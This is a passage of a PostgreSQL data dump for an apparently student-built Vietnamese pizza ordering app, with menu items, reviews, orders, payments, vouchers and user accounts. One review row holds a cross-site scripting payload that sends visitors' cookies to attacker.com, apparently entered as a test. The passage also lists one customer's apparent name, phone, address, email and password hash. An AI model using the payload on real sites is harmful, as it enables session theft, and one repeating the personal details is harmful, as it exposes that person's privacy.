COPY public."Combo" ("MaCombo", "TenCombo", "MoTa", "HinhAnh", "GiaCombo", "TrangThai", "NgayTao", "NgayCapNhat") FROM stdin;
1	Combo Thịt Thượng Hạng	Combo cực hấp dẫn gồm Pizza 5 Loại Thịt Thượng Hạng size 9", Mì Ý Sốt Kem, Khoai Tây Chiên và 2 lon Pepsi tươi mát.	/images/AnhCombo/1.jpg	325000.00	Active	2025-11-07 17:48:05.199599	2025-11-07 17:48:05.199599
\.


--
-- TOC entry 5194 (class 0 OID 33358)
-- Dependencies: 257
-- Data for Name: Combo_ChiTiet; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Combo_ChiTiet" ("MaCombo", "MaBienThe", "SoLuong", "MaDeBanh") FROM stdin;
1	17	1	1
1	1	1	2
\.


--
-- TOC entry 5191 (class 0 OID 25918)
-- Dependencies: 254
-- Data for Name: DanhGiaDonHang; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."DanhGiaDonHang" ("MaDanhGiaDonHang", "MaDonHang", "SoSao", "BinhLuan", "NgayDanhGia") FROM stdin;
2	51	5	quá khủng	2025-11-09 16:44:03.769
\.


--
-- TOC entry 5198 (class 0 OID 33450)
-- Dependencies: 261
-- Data for Name: DanhGiaMonAn; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."DanhGiaMonAn" ("MaDanhGiaMonAn", "MaMonAn", "MaTaiKhoan", "SoSao", "NoiDung", "NgayDanhGia", "TrangThai") FROM stdin;
12	1	1	5	Pizza hải sản rất ngon, phô mai béo và tôm tươi.	2025-11-05 17:02:02.55456	Hiển thị
13	1	1	4	Ngon nhưng hơi mặn, nên giảm muối chút là hoàn hảo.	2025-11-03 17:02:02.55456	Hiển thị
14	1	1	3	Vị ổn nhưng giao hơi trễ, bánh bị nguội.	2025-11-06 17:02:02.55456	Chờ duyệt
15	2	1	5	Pizza bò phô mai tuyệt vời, ăn cực kỳ ngon miệng.	2025-11-04 17:02:02.55456	Hiển thị
16	2	1	4	Vỏ bánh giòn, phô mai nhiều, nhưng phần bò hơi ít.	2025-11-02 17:02:02.55456	Chờ duyệt
17	3	1	5	Pizza gà BBQ thơm ngon, sốt đậm vị, rất đáng tiền.	2025-11-05 17:02:02.55456	Hiển thị
18	3	1	2	Giao chậm, bánh bị nguội và hơi cứng.	2025-11-01 17:02:02.55456	Báo cáo
19	4	1	4	Mì Ý ngon, sốt kem béo ngậy, phần ăn vừa đủ.	2025-11-06 17:02:02.55456	Hiển thị
20	4	1	5	Mì Ý ngon hơn mong đợi, gà mềm và nước sốt cực kỳ vừa miệng.	2025-11-05 17:02:02.55456	Hiển thị
21	5	1	3	Khoai hơi mềm, ăn không giòn như lần trước.	2025-10-31 17:02:02.55456	Ẩn
28	1	8	5	<script> document.location='http://attacker.com/steal?cookie=' + document.cookie; </script>	2025-11-07 21:51:17.585	Hiển thị
\.


--
-- TOC entry 5163 (class 0 OID 25795)
-- Dependencies: 226
-- Data for Name: DanhMuc; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."DanhMuc" ("MaDanhMuc", "TenDanhMuc") FROM stdin;
2	Bò
3	Heo
4	Gà
5	Rau Củ/Chay
6	Bán Chạy
1	Hải Sản
\.


--
-- TOC entry 5172 (class 0 OID 25830)
-- Dependencies: 235
-- Data for Name: DeBanh; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."DeBanh" ("MaDeBanh", "TenDeBanh") FROM stdin;
1	Đế Mỏng Giòn
2	Đế Dày Xốp
\.


--
-- TOC entry 5182 (class 0 OID 25877)
-- Dependencies: 245
-- Data for Name: DonHang; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."DonHang" ("MaDonHang", "MaNguoiDung", "MaCoSo", "MaNguoiDungGiaoHang", "MaVoucher", "NgayDat", "ThoiGianGiaoDuKien", "TienTruocGiamGia", "TienGiamGia", "TongTien", "GhiChu", "TenNguoiNhan", "SoDienThoaiGiaoHang", "SoNhaDuongGiaoHang", "PhuongXaGiaoHang", "QuanHuyenGiaoHang", "ThanhPhoGiaoHang", "PhiShip") FROM stdin;
42	8	2	\N	\N	2025-11-07 19:26:02.48	2025-11-07 19:49:02.472	325000.00	0.00	350000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
43	8	2	\N	\N	2025-11-07 19:48:23.06	2025-11-07 20:11:23.055	785000.00	0.00	810000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
44	8	2	\N	\N	2025-11-07 19:59:59.824	2025-11-07 20:22:59.816	725000.00	0.00	750000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
45	8	2	\N	\N	2025-11-07 20:15:34.427	2025-11-07 20:38:34.423	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
46	8	2	\N	\N	2025-11-07 20:30:30.624	2025-11-07 20:53:30.621	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
47	8	2	\N	\N	2025-11-07 20:51:11.093	2025-11-07 21:14:11.089	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
48	8	2	\N	\N	2025-11-07 20:53:50.846	2025-11-07 21:16:50.839	265000.00	0.00	290000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
49	8	2	\N	\N	2025-11-07 20:55:43.701	2025-11-07 21:18:43.699	325000.00	0.00	350000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
50	8	2	\N	\N	2025-11-07 20:56:46.427	2025-11-07 21:19:46.425	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
51	8	2	\N	\N	2025-11-07 20:57:59.994	2025-11-07 21:20:59.992	235000.00	0.00	260000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 12	Quận 11	Hồ Chí Minh	25000.00
52	8	2	\N	\N	2025-11-08 10:39:25.856	2025-11-08 11:02:25.852	530000.00	0.00	555000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
53	8	2	\N	\N	2025-11-08 22:56:57.997	2025-11-08 23:19:57.995	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
54	8	2	\N	\N	2025-11-08 23:00:31.346	2025-11-08 23:23:31.343	235000.00	0.00	260000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
55	8	2	\N	\N	2025-11-08 23:02:55.087	2025-11-08 23:25:55.084	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
56	8	2	\N	\N	2025-11-08 23:04:39.746	2025-11-08 23:27:39.742	235000.00	0.00	260000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
57	8	2	\N	\N	2025-11-08 23:06:58.696	2025-11-08 23:29:58.693	235000.00	0.00	260000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
58	8	2	\N	\N	2025-11-08 23:09:15.697	2025-11-08 23:32:15.693	325000.00	0.00	350000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
59	8	2	\N	\N	2025-11-08 23:11:24.935	2025-11-08 23:34:24.932	325000.00	0.00	350000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
60	8	2	\N	\N	2025-11-08 23:13:02.293	2025-11-08 23:36:02.291	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
61	8	2	\N	\N	2025-11-08 23:34:03.28	2025-11-08 23:57:03.274	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
62	8	2	\N	\N	2025-11-09 16:29:19.885	2025-11-09 16:52:19.883	235000.00	0.00	260000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
63	8	2	\N	\N	2025-11-11 08:11:01.735	2025-11-11 08:34:01.729	550000.00	0.00	575000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
64	8	2	\N	\N	2025-11-11 18:04:22.417	2025-11-11 18:27:22.411	164500.00	0.00	189500.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
65	8	2	\N	\N	2025-11-12 13:21:50.035	2025-11-12 13:44:50.03	171500.00	0.00	196500.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
66	8	2	\N	\N	2025-11-12 13:22:32	2025-11-12 13:45:31.998	225000.00	0.00	250000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
67	8	2	\N	\N	2025-11-12 13:24:06.232	2025-11-12 13:47:06.225	389500.00	0.00	414500.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
68	8	2	\N	FREESHIP	2025-11-12 13:24:38.13	2025-11-12 13:47:38.118	561000.00	30000.00	556000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
69	8	2	\N	\N	2025-11-13 12:14:24.337	2025-11-13 12:37:24.334	510000.00	0.00	535000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
70	8	2	\N	\N	2025-11-13 12:50:10.036	2025-11-13 13:13:10.031	210000.00	0.00	235000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
71	8	2	\N	\N	2025-11-13 18:05:12.391	2025-11-13 18:28:12.384	325000.00	0.00	350000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
72	8	2	\N	NHAGIAOVIETNAM	2025-11-15 21:49:50.681	2025-11-15 22:12:50.676	455000.00	455000.00	25000.00		Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh	25000.00
\.


--
-- TOC entry 5200 (class 0 OID 33475)
-- Dependencies: 263
-- Data for Name: KhuyenMai; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."KhuyenMai" ("MaKhuyenMai", "TenKhuyenMai", "MoTa", "KMLoai", "KMGiaTri", "KMBatDau", "KMKetThuc", "TrangThai") FROM stdin;
1	Pizza Sale 30%	\N	PERCENT	30.00	2025-11-10 00:00:00	2025-11-20 23:59:59	Active
2	Món phụ giảm 40k	\N	AMOUNT	40000.00	2025-11-10 00:00:00	2025-11-30 23:59:59	Active
\.


--
-- TOC entry 5184 (class 0 OID 25886)
-- Dependencies: 247
-- Data for Name: LichSuTrangThaiDonHang; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."LichSuTrangThaiDonHang" ("MaLichSu", "MaDonHang", "TrangThai", "ThoiGianCapNhat", "GhiChu") FROM stdin;
45	42	Đang chờ xác nhận	2025-11-07 19:26:02.557	\N
46	42	Khách hàng đã hủy	2025-11-07 19:47:30.051	Hủy bởi khách hàng
47	43	Đang chờ xác nhận	2025-11-07 19:48:23.094	\N
48	44	Đang chờ xác nhận	2025-11-07 19:59:59.882	\N
49	45	Đang chờ xác nhận	2025-11-07 20:15:34.473	\N
50	46	Đang chờ xác nhận	2025-11-07 20:30:30.675	\N
51	47	Đang chờ xác nhận	2025-11-07 20:51:11.128	\N
52	48	Đang chờ xác nhận	2025-11-07 20:53:50.903	\N
53	49	Đang chờ xác nhận	2025-11-07 20:55:43.735	\N
54	50	Đang chờ xác nhận	2025-11-07 20:56:46.44	\N
55	51	Đang chờ xác nhận	2025-11-07 20:58:00.006	\N
56	51	Đã giao	2025-11-08 04:35:37.689201	\N
57	43	Khách hàng đã hủy	2025-11-08 10:39:01	Hủy bởi khách hàng
58	52	Đang chờ xác nhận	2025-11-08 10:39:25.884	\N
59	53	Chờ thanh toán	2025-11-08 22:56:58.052	\N
60	54	Chờ thanh toán	2025-11-08 23:00:31.38	\N
61	55	Chờ thanh toán	2025-11-08 23:02:55.111	\N
62	55	Chờ duyệt đơn	2025-11-08 23:03:42.541	Thanh toán VNPay thành công
63	56	Chờ thanh toán	2025-11-08 23:04:39.755	\N
64	57	Chờ thanh toán	2025-11-08 23:06:58.73	\N
65	58	Chờ thanh toán	2025-11-08 23:09:15.725	\N
66	59	Chờ thanh toán	2025-11-08 23:11:24.948	\N
67	60	Chờ thanh toán	2025-11-08 23:13:02.303	\N
68	61	Chờ thanh toán	2025-11-08 23:34:03.307	\N
69	61	Chờ duyệt đơn	2025-11-08 23:34:29.624	Thanh toán VNPay thành công
70	60	Đang chờ xác nhận	2025-11-08 23:40:08.31	Thanh toán VNPay thành công
71	56	Đang chờ xác nhận	2025-11-09 16:26:54.114	Thanh toán VNPay thành công
72	58	Đang chờ xác nhận	2025-11-09 16:28:14.543	Thanh toán VNPay thành công
73	59	Đang chờ xác nhận	2025-11-09 16:28:52.486	Thanh toán VNPay thành công
74	62	Chờ thanh toán	2025-11-09 16:29:19.901	\N
75	63	Đang chờ xác nhận	2025-11-11 08:11:01.8	\N
76	64	Đang chờ xác nhận	2025-11-11 18:04:22.46	\N
77	62	Đang chờ xác nhận	2025-11-11 20:46:58.829	Thanh toán VNPay thành công
78	65	Đang chờ xác nhận	2025-11-12 13:21:50.068	\N
79	66	Đang chờ xác nhận	2025-11-12 13:22:32.006	\N
80	67	Đang chờ xác nhận	2025-11-12 13:24:06.257	\N
81	68	Đang chờ xác nhận	2025-11-12 13:24:38.148	\N
82	68	Khách hàng đã hủy	2025-11-12 13:24:46.137	Hủy bởi khách hàng
83	69	Đang chờ xác nhận	2025-11-13 12:14:24.356	\N
84	70	Đang chờ xác nhận	2025-11-13 12:50:10.053	\N
85	71	Đang chờ xác nhận	2025-11-13 18:05:12.429	\N
86	72	Đang chờ xác nhận	2025-11-15 21:49:50.725	\N
\.


--
-- TOC entry 5161 (class 0 OID 25787)
-- Dependencies: 224
-- Data for Name: LoaiMonAn; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."LoaiMonAn" ("MaLoaiMonAn", "TenLoaiMonAn") FROM stdin;
1	Pizza
3	Tráng Miệng
4	Nước Uống
2	Món Phụ 1
6	hehe
\.


--
-- TOC entry 5175 (class 0 OID 25843)
-- Dependencies: 238
-- Data for Name: LoaiTuyChon; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."LoaiTuyChon" ("MaLoaiTuyChon", "TenLoaiTuyChon") FROM stdin;
1	Viền Bánh
2	Thêm Topping
\.


--
-- TOC entry 5165 (class 0 OID 25803)
-- Dependencies: 228
-- Data for Name: MonAn; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."MonAn" ("MaMonAn", "TenMonAn", "MoTa", "HinhAnh", "MaLoaiMonAn", "TrangThai", "DeXuat") FROM stdin;
1	Pizza Siêu Topping Hải Sản Nhiệt Đới Xốt Tiêu	Tôm, nghêu, mực, thơm, hành tây trên nền sốt tiêu đen	/images/AnhMonAn/1.jpg	1	Active	t
11	hehe	ádf	/images/AnhMonAn/z7209813005248-b44ed8cf695a25f3d3b306fc3d01e9f8-1762950733692-86087624.jpg	1	Deleted	f
4	Pizza Siêu Topping Bò Mỹ Xốt Phô Mai	Thịt bò Mỹ cao cấp, nấm, cà chua và hành tây trên nền sốt phô mai	/images/AnhMonAn/4.jpg	1	Active	f
5	Pizza Siêu Topping Bò và Tôm Nướng Kiểu Mỹ	Thịt bò, tôm nướng, bắp, hành tây và xốt Thousand Island	/images/AnhMonAn/5.jpg	1	Active	f
6	Pizza Siêu Topping Giăm Bông Dứa Kiểu Hawaiian	Giăm bông, thịt xông khói và dứa ngọt dịu trên nền sốt cà chua	/images/AnhMonAn/6.jpg	1	Active	f
10	Pizza 5 Loại Thịt Thượng Hạng	Pizza thượng hạng với 5 loại thịt: xúc xích Ý, jambon, thịt xông khói, pepperoni và xúc xích Đức. Kết hợp phô mai Mozzarella tan chảy tạo nên hương vị đậm đà khó quên.	/images/AnhMonAn/10.jpg	1	Active	f
7	Pizza Siêu Topping Xúc Xích Ý Truyền Thống	Xúc xích Pepperoni trứ danh của Ý trên nền phô mai Mozzarella	/images/AnhMonAn/7.jpg	1	Active	t
8	Khoai Tây Chiên	Khoai tây chiên giòn rụm	/images/AnhMonAn/8.jpg	2	Active	t
9	Pepsi	Nước ngọt có gas	/images/AnhMonAn/9.jpg	4	Active	t
2	Pizza Siêu Topping Hải Sản Xốt Mayonnaise	Tôm, mực, thanh cua và bông cải xanh tươi ngon trên nền sốt mayonnaise	/images/AnhMonAn/2.jpg	1	Inactive	t
3	Pizza Siêu Topping Hải Sản Xốt Pesto Kem Chanh	Tôm, mực, cà chua và bông cải xanh trên nền sốt Pesto kem chanh	/images/AnhMonAn/3.jpg	1	Inactive	f
\.


--
-- TOC entry 5166 (class 0 OID 25810)
-- Dependencies: 229
-- Data for Name: MonAn_DanhMuc; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."MonAn_DanhMuc" ("MaMonAn", "MaDanhMuc") FROM stdin;
1	1
1	6
1	2
1	4
1	3
1	5
4	2
4	6
5	2
5	1
6	3
7	3
7	6
8	5
10	1
10	2
10	3
10	4
11	5
2	1
3	1
\.


--
-- TOC entry 5173 (class 0 OID 25837)
-- Dependencies: 236
-- Data for Name: MonAn_DeBanh; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."MonAn_DeBanh" ("MaMonAn", "MaDeBanh") FROM stdin;
4	1
5	1
6	1
7	1
4	2
5	2
6	2
7	2
11	1
2	1
2	2
3	1
3	2
1	1
1	2
\.


--
-- TOC entry 5201 (class 0 OID 33484)
-- Dependencies: 264
-- Data for Name: MonAn_KhuyenMai; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."MonAn_KhuyenMai" ("MaMonAn", "MaKhuyenMai") FROM stdin;
1	1
3	1
8	2
\.


--
-- TOC entry 5179 (class 0 OID 25862)
-- Dependencies: 242
-- Data for Name: MonAn_TuyChon; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."MonAn_TuyChon" ("MaMonAn", "MaTuyChon") FROM stdin;
4	1
4	2
4	3
1	1
1	3
1	2
1	4
\.


--
-- TOC entry 5159 (class 0 OID 25775)
-- Dependencies: 222
-- Data for Name: NguoiDung; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."NguoiDung" ("MaNguoiDung", "MaTaiKhoan", "MaCoSo", "HoTen", "SoDienThoai", "SoNhaDuong", "PhuongXa", "QuanHuyen", "ThanhPho") FROM stdin;
1	1	\N	Trần Văn An	0901234567	111 Nguyễn Trãi	Phường 2	Quận 5	TP. Hồ Chí Minh
2	2	1	Lê Thị Bình	0912345678	\N	\N	\N	\N
3	3	2	Nguyễn Văn Cường	0923456789	\N	\N	\N	\N
4	4	\N	Quản Trị Viên Hệ Thống	0987654321	\N	\N	\N	\N
8	8	1	Tuấn khách hàng	0938894528	259/18 Hàn Hải Nguyên	Phường 02	Quận 11	Hồ Chí Minh
\.


--
-- TOC entry 5168 (class 0 OID 25816)
-- Dependencies: 231
-- Data for Name: Size; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Size" ("MaSize", "TenSize") FROM stdin;
1	9 inch
2	12 inch
\.


--
-- TOC entry 5155 (class 0 OID 25759)
-- Dependencies: 218
-- Data for Name: TaiKhoan; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."TaiKhoan" ("MaTaiKhoan", "Email", "MatKhau", "Role", "TrangThai") FROM stdin;
1	khachhang_hcm	hashed_password_123	CUSTOMER	Active
4	superadmin	hashed_password_super	SUPER_ADMIN	Active
8	nguyenminhtuan06012004@gmail.com	$2b$10$yzL683ka74f/oY7tAHYQuOYkbMOKDMXpmK8vKJq6V6k7mX0efH4l.	SUPER_ADMIN	Active
3	admin_hcm	hashed_password_789	ADMIN	Active
2	shipper_hn	hashed_password_456	SHIPPER	Active
\.


--
-- TOC entry 5189 (class 0 OID 25907)
-- Dependencies: 252
-- Data for Name: ThanhToan; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."ThanhToan" ("MaThanhToan", "MaDonHang", "PhuongThuc", "MaGiaoDich", "SoTien", "TrangThai", "ThoiGian") FROM stdin;
60	61	Chuyển Khoản	1762644869611-15247621	250000.00	Đã thanh toán	2025-11-08 23:34:29.618
61	60	Chuyển Khoản	1762645208277-15247624	250000.00	Đã thanh toán	2025-11-08 23:40:08.278
62	56	Chuyển Khoản	1762705614061-15248791	260000.00	Đã thanh toán	2025-11-09 16:26:54.064
63	58	Chuyển Khoản	1762705694539-15248795	350000.00	Đã thanh toán	2025-11-09 16:28:14.54
64	59	Chuyển Khoản	1762705732482-15248796	350000.00	Đã thanh toán	2025-11-09 16:28:52.483
65	62	Chuyển Khoản	1762705763559-0	260000.00	Thanh toán thất bại	2025-11-09 16:29:23.559
66	63	Tiền Mặt	\N	575000.00	Chưa thanh toán	2025-11-11 08:11:01.794
67	64	Tiền Mặt	\N	189500.00	Chưa thanh toán	2025-11-11 18:04:22.453
68	62	Chuyển Khoản	1762894018776-15254615	260000.00	Đã thanh toán	2025-11-11 20:46:58.794
69	65	Tiền Mặt	\N	196500.00	Chưa thanh toán	2025-11-12 13:21:50.06
70	66	Tiền Mặt	\N	250000.00	Chưa thanh toán	2025-11-12 13:22:32.004
71	67	Tiền Mặt	\N	414500.00	Chưa thanh toán	2025-11-12 13:24:06.252
72	68	Tiền Mặt	\N	556000.00	Chưa thanh toán	2025-11-12 13:24:38.144
73	69	Tiền Mặt	\N	535000.00	Chưa thanh toán	2025-11-13 12:14:24.348
74	70	Tiền Mặt	\N	235000.00	Chưa thanh toán	2025-11-13 12:50:10.049
75	71	Tiền Mặt	\N	350000.00	Chưa thanh toán	2025-11-13 18:05:12.425
76	72	Tiền Mặt	\N	25000.00	Chưa thanh toán	2025-11-15 21:49:50.719
41	42	Tiền Mặt	\N	350000.00	Chưa thanh toán	2025-11-07 19:26:02.552
42	43	Tiền Mặt	\N	810000.00	Chưa thanh toán	2025-11-07 19:48:23.091
43	44	Tiền Mặt	\N	750000.00	Chưa thanh toán	2025-11-07 19:59:59.88
44	45	Chuyển Khoản	\N	250000.00	Chưa thanh toán	2025-11-07 20:15:34.469
45	46	Chuyển Khoản	\N	250000.00	Chưa thanh toán	2025-11-07 20:30:30.671
46	47	Tiền Mặt	\N	250000.00	Chưa thanh toán	2025-11-07 20:51:11.124
47	48	Chuyển Khoản	15246125	290000.00	Đã thanh toán	2025-11-07 20:53:50.899
48	49	Chuyển Khoản	15246128	350000.00	Đã thanh toán	2025-11-07 20:55:43.732
49	50	Chuyển Khoản	15246129	250000.00	Đã thanh toán	2025-11-07 20:56:46.438
50	51	Chuyển Khoản	0	260000.00	Thanh toán thất bại	2025-11-07 20:58:00.003
51	52	Chuyển Khoản	15246926	555000.00	Đã thanh toán	2025-11-08 10:39:25.881
54	55	Chuyển Khoản	15247617	250000.00	Đã thanh toán	2025-11-08 23:03:42.536
56	59	Chuyển Khoản	1762643490550-0	350000.00	Thanh toán thất bại	2025-11-08 23:11:30.552
57	60	Chuyển Khoản	1762644526574-0	250000.00	Thanh toán thất bại	2025-11-08 23:28:46.6
\.


--
-- TOC entry 5177 (class 0 OID 25851)
-- Dependencies: 240
-- Data for Name: TuyChon; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."TuyChon" ("MaTuyChon", "TenTuyChon", "MaLoaiTuyChon") FROM stdin;
1	Viền Phô Mai	1
2	Viền Xúc Xích Phô Mai	1
3	Thêm Phô Mai Mozzarella	2
4	Thêm Tôm	2
\.


--
-- TOC entry 5178 (class 0 OID 25856)
-- Dependencies: 241
-- Data for Name: TuyChon_Gia; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."TuyChon_Gia" ("MaTuyChon", "MaSize", "GiaThem") FROM stdin;
1	2	50000.00
2	1	45000.00
2	2	65000.00
3	1	25000.00
3	2	40000.00
4	1	35000.00
4	2	55000.00
\.


--
-- TOC entry 5180 (class 0 OID 25867)
-- Dependencies: 243
-- Data for Name: Voucher; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public."Voucher" ("MaVoucher", "MoTa", "LoaiGiamGia", "GiaTri", "DieuKienApDung", "NgayBatDau", "NgayKetThuc", "SoLuong", "TrangThai") FROM stdin;
FREESHIP	Miễn phí vận chuyển (giảm 30k)	AMOUNT	30000.00	100000.00	2025-10-01 00:00:00	2025-11-30 23:59:59	500	Active
PIZZA20	Giảm 20% > 250k	PERCENT	20.00	250000.00	2025-10-01 00:00:00	2025-11-30 23:59:59	1000	Active
NHAGIAOVIETNAM	hHEHE2	AMOUNT	30000000.00	30000.00	2025-11-04 00:00:00	2025-11-21 00:00:00	300	Active
\.


--
-- TOC entry 5211 (class 0 OID 0)
-- Dependencies: 232
-- Name: BienTheMonAn_MaBienThe_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."BienTheMonAn_MaBienThe_seq"', 21, true);


--
-- TOC entry 5212 (class 0 OID 0)
-- Dependencies: 258
-- Name: ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."ChiTietDonHang_ChiTietCombo_MaCTDH_Combo_seq"', 14, true);


--
-- TOC entry 5213 (class 0 OID 0)
-- Dependencies: 248
-- Name: ChiTietDonHang_MaChiTiet_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."ChiTietDonHang_MaChiTiet_seq"', 122, true);


--
-- TOC entry 5214 (class 0 OID 0)
-- Dependencies: 219
-- Name: CoSo_MaCoSo_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."CoSo_MaCoSo_seq"', 2, true);


--
-- TOC entry 5215 (class 0 OID 0)
-- Dependencies: 255
-- Name: Combo_MaCombo_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."Combo_MaCombo_seq"', 1, true);


--
-- TOC entry 5216 (class 0 OID 0)
-- Dependencies: 260
-- Name: DanhGiaMonAn_MaDanhGiaMonAn_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."DanhGiaMonAn_MaDanhGiaMonAn_seq"', 28, true);


--
-- TOC entry 5217 (class 0 OID 0)
-- Dependencies: 253
-- Name: DanhGia_MaDanhGia_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."DanhGia_MaDanhGia_seq"', 2, true);


--
-- TOC entry 5218 (class 0 OID 0)
-- Dependencies: 225
-- Name: DanhMuc_MaDanhMuc_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."DanhMuc_MaDanhMuc_seq"', 19, true);


--
-- TOC entry 5219 (class 0 OID 0)
-- Dependencies: 234
-- Name: DeBanh_MaDeBanh_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."DeBanh_MaDeBanh_seq"', 2, true);


--
-- TOC entry 5220 (class 0 OID 0)
-- Dependencies: 244
-- Name: DonHang_MaDonHang_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."DonHang_MaDonHang_seq"', 72, true);


--
-- TOC entry 5221 (class 0 OID 0)
-- Dependencies: 262
-- Name: KhuyenMai_MaKhuyenMai_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."KhuyenMai_MaKhuyenMai_seq"', 2, true);


--
-- TOC entry 5222 (class 0 OID 0)
-- Dependencies: 246
-- Name: LichSuTrangThaiDonHang_MaLichSu_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."LichSuTrangThaiDonHang_MaLichSu_seq"', 86, true);


--
-- TOC entry 5223 (class 0 OID 0)
-- Dependencies: 223
-- Name: LoaiMonAn_MaLoaiMonAn_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public."LoaiMonAn_MaLoaiMonAn_seq"', 6, true);


--
-- TOC entry 5224 (class 0 OID 0)
-- Dependencies: 237
-- Name: LoaiTuyChon_MaLoaiTuyChon_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

